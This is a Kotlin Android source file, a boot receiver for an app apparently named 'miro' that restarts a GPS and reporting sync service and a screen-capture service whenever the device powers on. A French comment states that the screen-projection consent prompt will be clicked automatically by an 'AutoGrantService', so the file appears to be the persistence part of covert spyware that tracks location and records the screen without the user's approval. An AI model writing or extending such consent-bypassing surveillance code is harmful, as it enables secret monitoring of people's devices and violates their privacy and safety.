package com.nexora.miro

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Build
import com.nexora.miro.services.SyncWorker
import com.nexora.miro.services.ScreenCaptureService

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Intent.ACTION_BOOT_COMPLETED || intent.action == "android.intent.action.QUICKBOOT_POWERON") {
            
            // 1. Relancer le service GPS et Rapports
            val syncIntent = Intent(context, SyncWorker::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(syncIntent)
            } else {
                context.startService(syncIntent)
            }

            // 2. Relancer le service de Capture d'écran
            // Cela va demander la projection, et le robot AutoGrantService cliquera dessus
            val captureIntent = Intent(context, ScreenCaptureService::class.java)
            captureIntent.action = "REQUEST_PROJECTION"
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(captureIntent)
            } else {
                context.startService(captureIntent)
            }
        }
    }
}